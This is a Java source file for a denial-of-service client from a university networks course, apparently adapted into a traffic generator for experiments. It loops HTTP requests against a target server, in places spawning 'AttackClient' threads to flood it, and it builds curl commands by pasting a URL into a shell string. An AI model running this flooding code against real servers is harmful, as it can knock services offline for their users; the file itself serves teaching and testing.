/*
 * DOSClient.java
 * Sep 8, 2011
 *
 * Simple Denial-of-Service Client (SDC) for EE407/507 and CS455/555
 * 
 * Copyright (C) 2011 Chandan Raj Rupakheti, Clarkson University
 * 
 * This program is created for the propose of understanding some simple 
 * cases of Denial-of-Service attack in an university-level computer networks 
 * course. The author do not take any responsibility for the use or the misuse 
 * of this program by any party. The author also intends to make it clear that 
 * it is illegal to launch a Denial-of-Service attack of any form and is punishable 
 * by the lab.
 * 
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public License 
 * as published by the Free Software Foundation, either 
 * version 3 of the License, or any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/lgpl.html>.
 * 
 * Contact Us:
 * Chandan Raj Rupakheti (rupakhcr@clarkson.edu)
 * Department of Electrical and Computer Engineering
 * Clarkson University
 * Potsdam
 * NY 13699-5722
 * http://clarkson.edu/~rupakhcr
 */
package dos;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;

/**
 * This class connects to a HTTP web server and asks for a resource file
 * continuously in a loop. While doing this, it first opens a TCP connection,
 * uses a GET request for a file, receives the file and ignores it, and finally
 * closes the connection and iterates the process again and again. If multiple
 * clients coordinate together, then a vulnerable web server can be taken down. 
 * 
 * It implements {@link Runnable} interface to be used with a {@link Thread}.
 *
 * @author Chandan R. Rupakheti
 */
public class DOSClient implements Runnable {
	private String server;
	private int port;
	private String uri;
	private boolean stop;
	private long delay;

	private long connections;
	private long serviceTime;
	private DOSAttackWindow window;

	public DOSClient(DOSAttackWindow window, String server, int port) {
		this.window = window;
		this.server = server;
		this.port = port;
		this.uri = "/"; // Default root
		this.delay = 500; // 500 millis
		this.stop = false;
		this.connections = 0;
		this.serviceTime = 0;
	}

	public DOSClient(String server, int port, String uri) {
		this.server = server;
		this.port = port;
		this.uri = uri;
		this.delay = 500; // 500 millis
		this.stop = false;
		this.connections = 0;
		this.serviceTime = 0;
	}

	/**
	 * Get the service rate this client recieves from the server.
	 * It is equal to (number of connections)/(cumulative service time).
	 * 
	 * @return The service rate.
	 */
	public double getServiceRate() {
		if(this.serviceTime == 0)
			return Double.MIN_VALUE;
		double rate = this.connections/(double)this.serviceTime;
		rate = rate * 1000;
		return rate;
	}

	/**
	 * Gets the file to be retrieved.
	 * 
	 * @return the uri
	 */
	public String getUri() {
		return uri;
	}

	/**
	 * Sets the file to be retrieved.
	 * 
	 * @param uri the uri to set
	 */
	public void setUri(String uri) {
		this.uri = uri;
	}

	/**
	 * Gets the wait time for attempting next connection in the loop.
	 * 
	 * @return the delay
	 */
	public long getDelay() {
		return delay;
	}

	/**
	 * Sets the wait time for attempting next connection in the loop.
	 * 
	 * @param delay the delay to set
	 */
	public void setDelay(long delay) {
		this.delay = delay;
	}


	/**
	 * Stops the running thread.
	 */
	public void stop() {
		this.stop = true;
	}


	public void run() {
		while(!this.stop) {
			try {
				if(Test.ATTACKER_VAR==0){
					if (Math.random() < 0.4){ //40% di probabilit� di fare una richiesta
						this.makeRequest();
					}
				}else{
					 if(Math.random()<0.5){
						 new Thread (new AttackClient(server, port, uri)).start();
						 Thread.sleep(Test.ATTACK_LENGHT);
					 }
				}

				// Wait for a while
				Logger.write("sleep...");
				Thread.sleep(delay);
				Logger.write("awake...");
			}
			catch(Exception e){
				e.printStackTrace();
			}
		}
	}

	void makeRequest(){
		HttpURLConnection connection = null;
		String targetURL;
		Integer index;
		String file;
		boolean getFlag;

		if (Math.random() < 0.7 && Test.HASHMAPS.getFilesToGet().size() > 0){ //70% di probabilit� di fare GET
			getFlag = true;
		}else{
			getFlag = false;
		}

		Logger.write("getFlag: "+getFlag);

		if(getFlag){
			try {
				index = (int)(Math.random() * (Test.HASHMAPS.getFilesToGet().size()));
				file = (String) Test.HASHMAPS.getFilesToGet().values().toArray()[index];

				targetURL = this.server+":"+this.port+"/"+this.uri+"/"+file+"?atk="+Test.ATTACKER_VAR; //build the URL

				Logger.write("Rnd index: "+index+" file: "+file+" targetURL: "+targetURL+" GET");

				//Create connection
				URL url = new URL(targetURL);
				connection = (HttpURLConnection)url.openConnection();
				connection.setRequestMethod("GET");
				Logger.write("GET " + targetURL + " " + Test.ATTACKER_VAR); //debug print
				//Get Response 
				InputStream is = connection.getInputStream(); //se non trova il file (404) allora va in exception
				BufferedReader rd = new BufferedReader(new InputStreamReader(is));
				
				rd.close();
			} catch (Exception e) {
				e.printStackTrace();
				return;
			} finally {
				if(connection != null) {connection.disconnect();}
			}
		} else{
			//execute cmd to put/delete
			index = (int)(Math.random() * (Test.HASHMAPS.getFilesToPut().size())); //integer [0-9]
			file = Test.HASHMAPS.getFilesToPut().get(index);
			targetURL = this.server+":"+this.port+"/"+this.uri+"/"+file+"?atk="+Test.ATTACKER_VAR; //build the URL



			if(Test.HASHMAPS.getFilesToGet().get(index) == null){
				//put
				try {
					Logger.write("Rnd index: "+index+" file: "+file+" targetURL: "+targetURL+" PUT");
					ProcessBuilder pb = new ProcessBuilder("curl", "--data", "@"+file, "--request", "PUT", targetURL);
					pb.redirectErrorStream(true);
					pb.start();
					Test.HASHMAPS.getFilesToGet().put(index, file);
				} catch (IOException e) {
					e.printStackTrace();
				}

			}else{
				//delete
				try {
					Logger.write("Rnd index: "+index+" file: "+file+" targetURL: "+targetURL+" DELETE");
					this.executeCommand("curl --request DELETE '"+targetURL+"'");
					ProcessBuilder pb = new ProcessBuilder("curl", "--request", "DELETE", targetURL);
					pb.redirectErrorStream(true);
					pb.start();
					Test.HASHMAPS.getFilesToGet().remove(index);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		}

		return;

	}




	public String executeCommand(String command) {


		/* ProcessBuilder pb = new ProcessBuilder("curl", "--data", "@file");

		    pb.directory(new File("/home/your_user_name/Pictures"));
		    pb.redirectErrorStream(true);
		    Process p = pb.start();
		    InputStream is = p.getInputStream();

		    FileOutputStream outputStream = new FileOutputStream(
		            "/home/your_user_name/Pictures/simpson_download.jpg");

		    String line;
		    BufferedInputStream bis = new BufferedInputStream(is);
		    byte[] bytes = new byte[100];
		    int numberByteReaded;
		    while ((numberByteReaded = bis.read(bytes, 0, 100)) != -1) {

		        outputStream.write(bytes, 0, numberByteReaded);
		        Arrays.fill(bytes, (byte) 0);

		    }

		    outputStream.flush();
		    outputStream.close();

		 */ return "asd";
	}









	/** NOT USED
	 * The entry point of the thread.
	 * The main action happens inside this method.
	 */
	public void run_old() {
		while(!this.stop) {
			long start = System.currentTimeMillis();

			Socket socket;
			try {
				// Open socket connection to the server
				socket = new Socket(server, port);
			}
			catch(Exception e) {
				// Report connection error
				window.showSocketException(e);
				continue;
			}

			// Prepare the request buffer
			StringBuffer buffer = new StringBuffer();
			buffer.append("GET " + this.uri + " HTTP/1.1");
			buffer.append("\r\n");
			buffer.append("connection: keep-alive");
			buffer.append("\r\n");
			buffer.append("accept-language: en-us,en;q=0.5");
			buffer.append("\r\n");
			buffer.append("host: localhost:8080");
			buffer.append("\r\n");
			buffer.append("accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7");
			buffer.append("\r\n");
			buffer.append("accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			buffer.append("\r\n");
			buffer.append("\r\n");

			try {
				// Write the request to the socket
				OutputStream outStream = socket.getOutputStream();
				PrintStream printStream = new PrintStream(outStream);
				System.out.println(buffer.toString());
				printStream.flush();

				// Read and ignore the request
				InputStream inStream = socket.getInputStream();
				byte[] chunk = new byte[4096]; // read 4KB chunk at a time

				// Keep reading until the end but ignore the data. See ";" at the end of while
				// which means do nothing
				while(inStream.read(chunk) != -1);

				// Close the socket
				socket.close();
			}
			catch(Exception e) {
				e.printStackTrace();
			}

			// Update metrics
			long end = System.currentTimeMillis();
			long diff = end-start;
			this.connections += 1;
			this.serviceTime += diff;

			// Wait for a while
			try {
				Thread.sleep(delay);
			}
			catch(Exception e){}
		}
	}
}
